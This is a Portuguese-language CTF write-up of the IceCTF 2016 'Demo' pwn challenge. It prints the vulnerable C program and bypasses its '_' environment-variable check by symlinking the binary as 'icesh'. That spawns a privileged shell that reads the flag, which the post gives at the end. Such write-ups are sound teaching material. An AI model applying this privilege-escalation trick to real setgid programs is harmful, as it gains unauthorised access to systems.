---
layout: post
title: Demo (55 pts - stage 2) - IceCTF 2016
description: Challenge Demo (55 pts) of IceCTF 2016
keywords: demo, pwn, IceCTF, pwn, 2016
tags: [IceCTF]
---

* **CTF:** IceCTF 2016
* **Challenge:** Demo (55 pts - stage 2)
* **Category:** Pwn
* **Solved by:** RTFM[ChOkO] 

****  
>Description: I found this awesome premium shell, but my demo version just ran out... can you help me crack it? /home/demo/ on the shell    
****  

Ao conectar na webshell do IceCTF navegamos ao diretório /home/demo e encontramos o arquivo demo.c, a seguir:
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <libgen.h>
#include <string.h>

void give_shell() {
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh");
}

int main(int argc, char *argv[]) {
    if(strncmp(basename(getenv("_")), "icesh", 6) == 0){
        give_shell();
    }
    else {
        printf("I'm sorry, your free trial has ended.\n");
    }
    return 0;
}
```

A resolução é bem direta: Basta criar um diretório temporário e um link simbólico para o arquivo /home/demo/demo com o nome esperado na comparação (icesh):

```bash
ln -s /home/demo/demo icesh
./icesh
cat /home/demo/flag.txt # \o/
```
*Flag:* IceCTF{wH0_WoU1d_3vr_7Ru5t_4rgV}
